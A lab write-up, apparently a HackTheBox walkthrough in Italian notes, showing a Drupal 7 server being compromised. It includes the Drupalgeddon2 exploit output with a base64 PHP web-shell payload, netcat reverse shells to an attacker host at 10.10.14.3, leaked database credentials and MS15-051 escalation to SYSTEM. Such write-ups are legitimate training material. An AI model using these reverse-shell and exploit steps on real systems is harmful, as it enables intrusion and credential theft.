@@ -1,0 +1,214 @@
+10.10.10.9
+
+80/tcp    open  http    Microsoft IIS httpd 7.5
+|_http-generator: Drupal 7 (http://drupal.org)
+| http-robots.txt: 36 disallowed entries (15 shown)
+| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
+| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
+| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
+|_/LICENSE.txt /MAINTAINERS.txt
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-title: Welcome to 10.10.10.9 | 10.10.10.9
+|_http-server-header: Microsoft-IIS/7.5
+135/tcp   open  msrpc   Microsoft Windows RPC
+49154/tcp open  msrpc   Microsoft Windows RPC
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+
+check con rpcdump porta 135:
+
+python3 /usr/share/doc/python3-impacket/examples/rpcdump.py -p 135 10.10.10.9 > rpcdump
+
+
+porta 80:
+
+c'è Drupal (open source CMS)
+ pagina di login di drupal, non riesco ad accedere 
+
+ ci sono molte entries nel file robots.txt (salvato a parte)
+
+ provo gobuster
+
+ sudo gobuster  dir -u http://10.10.10.9/ -w /usr/share/wordlists/dirb/big.txt -q -n -e -x .php,.html,.txt,.htm,.js,.xml,.svg,.py,.csv
+
+per drupal ci sono vari exploit RCE 
+https://www.exploit-db.com/exploits/44542
+https://www.exploit-db.com/exploits/44557
+
+ma sono authenticated  e non so ancora come accedere 
+
+tra l'altro non sono riuscito ancor aa trovare la versione quindi non so se funzionano 
+
+c'è anche una versione unauthenticated (CVE-2018-7600) che funziona su alcune versioni, vale la pensa provare:
+
+https://research.checkpoint.com/2018/uncovering-drupalgeddon-2/
+
+POC:
+
+https://github.com/a2u/CVE-2018-7600
+
+
+python3 exploit.py 
+################################################################
+# Proof-Of-Concept for CVE-2018-7600
+# by Vitalii Rudnykh
+# Thanks by AlbinoDrought, RicterZ, FindYanot, CostelSalanders
+# https://github.com/a2u/CVE-2018-7600
+################################################################
+Provided only for educational or information purposes
+
+Enter target url (example: https://domain.ltd/): http://10.10.10.9/
+Not exploitable
+
+
+dice Not Exploitable...
+
+posso provare quest altro exploit, è lo stesso ma va ad agire su altri campi che sono vuonerabili (forse) in altre versioni:
+
+https://github.com/dreadlocked/Drupalgeddon2
+
+
+questo funziona! mi restituisce una shell:
+
+ruby drupalgeddon2.rb http://10.10.10.9/
+[*] --==[::#Drupalggedon2::]==--
+--------------------------------------------------------------------------------
+[i] Target : http://10.10.10.9/
+--------------------------------------------------------------------------------
+[+] Found  : http://10.10.10.9/CHANGELOG.txt    (HTTP Response: 200)
+[+] Drupal!: v7.54
+--------------------------------------------------------------------------------
+[*] Testing: Form   (user/password)
+[+] Result : Form valid
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+[*] Testing: Clean URLs
+[+] Result : Clean URLs enabled
+--------------------------------------------------------------------------------
+[*] Testing: Code Execution   (Method: name)
+[i] Payload: echo WMSXHACF
+[+] Result : WMSXHACF
+[+] Good News Everyone! Target seems to be exploitable (Code execution)! w00hooOO!
+--------------------------------------------------------------------------------
+[*] Testing: Existing file   (http://10.10.10.9/shell.php)
+[i] Response: HTTP 404 // Size: 12
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+[*] Testing: Writing To Web Root   (./)
+[i] Payload: echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee shell.php
+[!] Target is NOT exploitable [2-4] (HTTP Response: 404)...   Might not have write access?
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+[*] Testing: Existing file   (http://10.10.10.9/sites/default/shell.php)
+[i] Response: HTTP 404 // Size: 12
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+[*] Testing: Writing To Web Root   (sites/default/)
+[i] Payload: echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee sites/default/shell.php
+[!] Target is NOT exploitable [2-4] (HTTP Response: 404)...   Might not have write access?
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+[*] Testing: Existing file   (http://10.10.10.9/sites/default/files/shell.php)
+[i] Response: HTTP 404 // Size: 12
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+[*] Testing: Writing To Web Root   (sites/default/files/)
+[*] Moving : ./sites/default/files/.htaccess
+[i] Payload: mv -f sites/default/files/.htaccess sites/default/files/.htaccess-bak; echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee sites/default/files/shell.php
+[!] Target is NOT exploitable [2-4] (HTTP Response: 404)...   Might not have write access?
+[!] FAILED : Couldn't find a writeable web path
+--------------------------------------------------------------------------------
+[*] Dropping back to direct OS commands
+drupalgeddon2>> id
+
+drupalgeddon2>> whoami
+nt authority\iusr
+
+
+
+questa shell è molto lenta eprò, quindi vedo se riesco a mettere nc sulla macchina e crearmi la reverse shell
+
+drupalgeddon2>> copy \\10.10.14.3\share\nc64.exe nc64.exe
+1 file(s) copied.
+
+drupalgeddon2>> cmd.exe /c nc64.exe -e cmd.exe 10.10.14.3 1234
+
+ora ho una shell migliore 
+
+C:\inetpub\drupal-7.54>whoami
+whoami
+nt authority\iusr
+
+C:\inetpub\drupal-7.54>
+
+copio il file C:\inetpub\drupal-7.54\sites\default\settings.php dalla macchina per vedere se ci trovo qualcosa di utile:
+
+$databases = array (
+  'default' => 
+  array (
+    'default' => 
+    array (
+      'database' => 'drupal',
+      'username' => 'root',
+      'password' => 'mysql123!root',
+      'host' => 'localhost',
+      'port' => '',
+      'driver' => 'mysql',
+      'prefix' => '',
+    ),
+  ),
+);
+
+$drupal_hash_salt = 'sHsUB6KgUSo7-xB5HyYfAcgpyy9R8xPGkMIUolnT-yY';
+
+
+
+c:\Users\dimitris\Desktop>type user.txt
+type user.txt
+5cb2772bea6b69468f1b98bbd21923b8
+
+vedo se riesco a trovare kernel exploits
+
+python3 /home/daerves/Desktop/tools/Windows-Exploit-Suggester-python3/windows-exploit-suggester.py -d 2022-07-09-mssb.xlsx -i systeminfo
+
+
+suggerisce molti exploit 
+
+tra questi funziona 
+
+MS15-051
+
+https://github.com/hfiref0x/CVE-2015-1701/raw/master/Compiled/Taihou64.exe
+
+C:\inetpub\drupal-7.54>copy \\10.10.14.3\share\Taihou64.exe
+copy \\10.10.14.3\share\Taihou64.exe
+        1 file(s) copied.
+
+
+non funziona 
+
+trovo una versione funzionante: https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS15-051/MS15-051-KB3045171.zip
+
+C:\inetpub\drupal-7.54>copy \\10.10.14.3\share\ms15-051x64.exe
+copy \\10.10.14.3\share\ms15-051x64.exe
+        1 file(s) copied.
+
+
+C:\inetpub\drupal-7.54>.\ms15-051x64.exe whoami
+.\ms15-051x64.exe whoami
+[#] ms15-051 fixed by zcgonvh
+[!] process with pid: 2400 created.
+==============================
+nt authority\system
+
+
+prendo reverse shell
+
+
+C:\inetpub\drupal-7.54>.\ms15-051x64.exe "cmd.exe /c nc64.exe -e cmd.exe 10.10.14.3 1233"
+
+
+
+C:\inetpub\drupal-7.54>whoami
+whoami
+nt authority\system
+
+
+C:\inetpub\drupal-7.54>type c:\users\administrator\desktop\root.txt
+type c:\users\administrator\desktop\root.txt
+979578c323dfd41c9b1fc15e58f28333
